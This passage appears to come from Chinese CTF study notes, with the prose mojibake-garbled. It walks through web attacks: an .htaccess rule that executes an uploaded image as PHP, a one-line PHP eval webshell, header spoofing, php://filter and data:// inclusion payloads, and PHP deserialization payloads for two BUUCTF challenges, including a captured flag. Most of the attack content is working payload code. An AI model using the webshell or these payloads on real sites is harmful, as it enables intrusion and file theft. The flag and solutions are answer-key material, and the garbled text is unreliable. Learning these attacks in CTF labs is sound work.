<pre><code>.htaccessæ–‡ä»¶(æˆ–è€…"åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶"ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚

æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚

å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚

ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚
</code></pre> 
<p>2.ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œæ³¨æ„æ–‡ä»¶åå¿…é¡»ç›¸åŒæ‰èƒ½å¤Ÿè¢«ä¸Šä¼ æˆåŠŸ</p> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span>FilesMatch <span class="token string">"webshell.jpg"</span><span class="token operator">&gt;</span>
SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php
<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span>
</code></pre> 
<p>3.ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬webshell.jpg</p> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'v'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>4.ç”¨èšå‰‘è¿æ¥è·å¾—flag<br> <img src="https://images2.imgbox.com/5b/8b/9b3HF0uf_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<h3><a id="HTTP_503"></a>HTTP</h3> 
<p>è¯·æ±‚å¤´Referer:http://xxxxx<br> ä¿®æ”¹è®¿é—®æµè§ˆå™¨ï¼šåœ¨User-Agentä¸­ä¿®æ”¹<br> åœ¨æœ¬åœ°è®¿é—®ï¼šX-Forwarded-For:127.0.0.1</p> 
<h3><a id="PHP_508"></a>PHP</h3> 
<h4><a id="_509"></a>åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h4> 
<pre><code>ï¼ˆ2021.3.24ï¼‰æœ€è¿‘åšåˆ°phpåºåˆ—åŒ–çš„é¢˜
çœ‹äº†å¥½å¤šå¸ˆå‚…ä»¬çš„åšå®¢å­¦åˆ°äº†å¾ˆå¤š
Y4å¸ˆå‚…åšå®¢ï¼šhttps://blog.csdn.net/solitudi/article/details/113588692?spm=1001.2014.3001.5502
è¿™é‡Œå°±æ‰“ç®—ç®€å•æ€»ç»“ä¸€ä¸‹ï¼Œä»¥å¤‡ä¹‹åå¤ä¹ 
</code></pre> 
<ul><li> <p>1.protected ,private,publicå±æ€§<br> var å’Œ public å£°æ˜çš„å­—æ®µéƒ½æ˜¯å…¬å…±å­—æ®µï¼Œå› æ­¤å®ƒä»¬çš„å­—æ®µåçš„åºåˆ—åŒ–æ ¼å¼æ˜¯ç›¸åŒçš„ã€‚å…¬å…±å­—æ®µçš„å­—æ®µåæŒ‰ç…§å£°æ˜æ—¶çš„å­—æ®µåè¿›è¡Œåºåˆ—åŒ–ï¼Œä½†åºåˆ—åŒ–åçš„å­—æ®µåä¸­ä¸åŒ…æ‹¬å£°æ˜æ—¶çš„å˜é‡å‰ç¼€ç¬¦å· $ã€‚</p> <p>protected å£°æ˜çš„å­—æ®µä¸ºä¿æŠ¤å­—æ®µï¼Œåœ¨æ‰€å£°æ˜çš„ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­å¯è§ï¼Œä½†åœ¨è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­ä¸å¯è§ã€‚å› æ­¤ä¿æŠ¤å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š \0*\0 çš„å‰ç¼€ï¼Œæ³¨æ„ï¼Œè¿™é‡Œçš„ \0 è¡¨ç¤º ASCII ç ä¸º 0 çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»è¿‡ urlencode åçœ‹åˆ°çš„ %00 ã€‚</p> <p>private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š \0\0 çš„å‰ç¼€ï¼Œè¿™é‡Œ è¡¨ç¤ºçš„æ˜¯å£°æ˜è¯¥ç§æœ‰å­—æ®µçš„ç±»çš„ç±»åï¼Œè€Œä¸æ˜¯è¢«åºåˆ—åŒ–çš„å¯¹è±¡çš„ç±»åã€‚å› ä¸ºå£°æ˜è¯¥ç§æœ‰å­—æ®µçš„ç±»ä¸ä¸€å®šæ˜¯è¢«åºåˆ—åŒ–çš„å¯¹è±¡çš„ç±»ï¼Œè€Œæœ‰å¯èƒ½æ˜¯å®ƒçš„ç¥–å…ˆç±»ã€‚åœ¨è¿›è¡Œé•¿åº¦è®¡ç®—çš„æ—¶å€™ï¼Œä¼šæŠŠ \0 ä¹Ÿè®¡ç®—ä¸Š<br> <code>ç»•è¿‡æ–¹æ³•</code>ï¼š<br> å†åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶å­—ç¬¦ä¸²å°±æ”¯æŒåé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤º</p> </li><li></ul> 
<h4><a id="buu_NiZhuanSiWei_528"></a>buu NiZhuanSiWei</h4> 
<p>é¢˜ç›®ç»™å‡ºæºç ï¼š</p> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php  
$text <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$file <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$password <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$text<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>$text<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>

<span class="token comment">//file_get_contents()å‡½æ•°çš„åŠŸèƒ½æ˜¯è¯»å–æ–‡ä»¶å†…å®¹åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²</span>
    echo <span class="token string">"&lt;br&gt;&lt;h1&gt;"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>$text<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1&gt;&lt;/br&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span>$file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        echo <span class="token string">"Not now!"</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">include</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>
        $password <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>$password<span class="token punctuation">)</span><span class="token punctuation">;</span>
        echo $password<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>1.ä½¿ç”¨dataä¼ªåè®®å’Œæ–‡ä»¶åŒ…å«ï¼š</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>read<span class="token operator">=</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span>useless<span class="token punctuation">.</span>php
</code></pre> 
<p>ç”¨php://inputä¼ªåè®®åœ¨ä»¥POSTå½¢å¼ä¼ å…¥â€œ welcome to the zjctf " ä¹Ÿå¯ä»¥ç”¨dataä¼ªåè®®ä¼ å‚</p> 
<pre><code class="prism language-javascript"><span class="token operator">/</span><span class="token operator">?</span>text<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>input<span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>read<span class="token operator">=</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span>useless<span class="token punctuation">.</span>php
</code></pre> 
<p>2.å¾—åˆ°base64ç¼–ç çš„é¡µé¢ï¼Œè§£å¯†å¦‚ä¸‹ï¼š</p> 
<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php  

<span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{<!-- --></span>  <span class="token comment">//flag.php ï¼ˆé¢˜ç›®æºç æ³¨é‡Šï¼‰ </span>
    <span class="token keyword">public</span> $file<span class="token punctuation">;</span>    
    <span class="token keyword">public</span> function <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  
            echo <span class="token function">file_get_contents</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//è¾“å‡ºæ–‡ä»¶å†…å®¹,é€šè¿‡è¿™ä¸ªå‡½æ•°è¯»å–flag</span>
            echo <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
<span class="token operator">?</span><span class="token operator">&gt;</span>  
</code></pre> 
<p>3.ååºåˆ—åŒ–ï¼š<br> <img src="https://images2.imgbox.com/35/2f/slyQ7Rpm_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> 4.é‡æ–°æ„é€ payload</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>useless<span class="token punctuation">.</span>php<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p>5.æœ€åæŸ¥çœ‹æºç å¾—åˆ°flag</p> 
<h4><a id="BUUCTF__2020_AreUSerialz_586"></a>BUUCTF [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h4> 
<ul><li> <p>çŸ¥è¯†ç‚¹ï¼šphpååºåˆ—åŒ–æ¼æ´ï¼Œå¼±ç±»å‹æ¯”è¾ƒ</p> </li><li> <p>æ‰“å¼€åœ°å€çœ‹åˆ°</p> </li></ul> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php

<span class="token function">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">protected</span> $op<span class="token punctuation">;</span>
    <span class="token keyword">protected</span> $filename<span class="token punctuation">;</span>
    <span class="token keyword">protected</span> $content<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        $op <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
        $filename <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        $content <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>
        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>op <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>op <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            $res <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span>$res<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>filename<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>content<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            $res <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>filename<span class="token punctuation">,</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>$res<span class="token punctuation">)</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        $res <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            $res <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> $res<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span>$s<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        echo <span class="token string">"[Result]: &lt;br&gt;"</span><span class="token punctuation">;</span>
        echo $s<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>op <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>op <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>content <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span>$s<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>$i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> $i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>$s<span class="token punctuation">)</span><span class="token punctuation">;</span> $i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>$s<span class="token punctuation">[</span>$i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span>$s<span class="token punctuation">[</span>$i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">{<!-- --></span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

    $str <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span>$str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        $obj <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>$str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>éœ€è¦ç»•è¿‡ä¸¤ä¸ªåœ°æ–¹<br> 1.ç»•è¿‡is_valid(),protectedå±æ€§<br> æ–¹æ³•ï¼šç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œåœ¨php7.1+çš„ç¯å¢ƒä¸‹å¯¹å±æ€§çš„è¦æ±‚ä¸æ˜¯å¾ˆæ•æ„Ÿ,ç”¨publicå±æ€§ç»•è¿‡privateå±æ€§äº§ç”Ÿçš„%00é—®é¢˜</p> 
<p>2.å¼±ç±»å‹ç»•è¿‡<br> __destruct()é­”æœ¯æ–¹æ³•ä¸­ï¼Œop==="2"æ˜¯å¼ºæ¯”è¾ƒï¼ˆç±»å‹å’Œå±æ€§éƒ½ç­‰äºâ€™2â€™ï¼‰ï¼Œè€Œprocess()ä½¿ç”¨çš„æ˜¯å¼±æ¯”è¾ƒop==â€œ2â€ï¼Œå¯ä»¥é€šè¿‡å¼±ç±»å‹ç»•è¿‡<br> æ–¹æ³•ï¼šop=2ï¼Œè¿™æ—¶op==="2"ä¸ºfalse,op=="2"ä¸ºtrue</p> 
<pre><code>private function read() {
        $res = "";
        if(isset($this-&gt;filename)) {
            $res = file_get_contents($this-&gt;filename);
        }
        return $res;
    }
    ```
å¯¹äºfile_get_contents()å‡½æ•°ï¼Œå¯ä»¥ç”¨php:filterä¼ªåè®®è¯»å–ï¼Œå°†filenameç½®ä¸º```php://filter/read=convert.base64-encode/resource=flag.php``ã€‚
```java
&lt;?php
class FileHandler {
    public $op = 2;
    public $filename = 'php://filter/read=convert.base64-encode/resource=flag.php';//æˆ–è€…ç›´æ¥è¯»'flag.php'
    public $content;
}
echo serialize(new FileHandler);
?&gt;
//O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
</code></pre> 
<p>payloadä¸º</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>str<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"FileHandler"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"op"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"filename"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">:</span><span class="token string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"content"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/47/6f/hs1tu1MO_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> å¾—åˆ°flag{12ffa359-defc-4dc6-b363-0b6f48c79b91}</p> 
<h3><a id="SSRF_710"></a>SSRF</h3> 
<ul><li>1.ä»‹ç»SSRF <a href="https://www.jianshu.com/p/d1d1c40f6d4c" rel="nofollow">å‚è€ƒæ–‡ç« </a></li></ul> 
